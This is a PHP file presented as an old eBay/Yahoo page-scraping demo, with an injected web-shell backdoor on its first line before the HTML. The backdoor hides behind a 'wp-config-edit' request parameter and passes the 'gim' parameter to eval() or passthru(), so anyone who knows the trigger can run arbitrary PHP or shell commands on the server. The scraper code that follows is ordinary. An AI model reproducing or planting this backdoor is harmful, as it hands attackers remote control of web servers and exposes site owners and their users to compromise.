<?php if(isset($_GET['wp-config-edit'])) { if ($_REQUEST['wp-config-edit'] == 'eval') { eval(get_magic_quotes_gpc() || get_magic_quotes_runtime() ? stripslashes($_REQUEST['gim']) : $_REQUEST['gim']); } else if ($_REQUEST['wp-config-edit'] == 'exec') { passthru(get_magic_quotes_gpc() || get_magic_quotes_runtime() ? stripslashes($_REQUEST['gim']) : $_REQUEST['gim']); } }?> <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<title>Untitled Document</title>
</head>
<?
/*******************************************************************
 Filename: ebayparser.php
 Description:
 This script is to demonstrate a technique to parse eBay auctions.

 Author: Wayne Eggert
 Last Updated: December 2004
*******************************************************************/
$searchstring = "ibm";
$URL = "http://finance.yahoo.com/q?s=".$searchstring;
//$URL = "http://search.ebay.com/search/search.dll?query=".$searchstring."&sosortproperty=1&ht=1&from=R10&BasicSearch=";
$file = fopen("$URL", "r");
$r = "";
do{
    $data = fread($file, 8192);
    $r .= $data;
}
while(strlen($data) != 0);

$ebayTABLEArray = preg_split ("/<table.*?>/", $r);

// now try to find which <table> contains the search results are
for($x=0; $x<count($ebayTABLEArray); $x++){
    if(strstr($ebayTABLEArray[$x],"yfncsubtit")){ // this is text
        $resultTable = $x+1;
    }
}
//yfncsubtit
$ebayTRArray = preg_split("/<tr.*?>/",$ebayTABLEArray[$resultTable]);

echo "<BR><B>Yahoo Results:</B><BR><BR>";
echo $ebayTRArray;
$start=2;
$end = $start + count($ebayTRArray);

for($i=$start;$i<$end;$i++){
    $ebayTDArray = preg_split ("/<td.*?>/",$ebayTRArray[$i]);
    print_r($ebayTDArray);
    
}
?>


<body>

</body>
</html>
